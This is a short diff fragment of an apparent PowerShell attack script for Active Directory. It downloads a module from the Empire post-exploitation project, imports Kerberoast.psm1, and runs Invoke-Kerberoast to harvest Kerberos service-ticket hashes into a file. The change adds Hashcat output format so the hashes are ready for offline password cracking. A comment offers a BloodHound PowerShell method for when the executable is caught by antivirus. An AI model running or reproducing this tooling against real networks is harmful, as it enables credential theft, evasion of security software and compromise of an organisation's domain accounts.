@@ -44,7 +44,7 @@ $client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/mas
 Write-Host "Importing module..." 
 Import-Module Kerberoast.psm1
 Write-Host "Running Kerberoast, if you see red, it's normal." -ForegroundColor  Yellow
-Invoke-Kerberoast | Out-File $path\Kerberoast.krb 
+Invoke-Kerberoast -OutputFormat Hashcat | Out-File $path\Kerberoast.krb 
 
 #BloodHound Powershell Method -- Use this if .Exe is picked up by AV. 
 <#
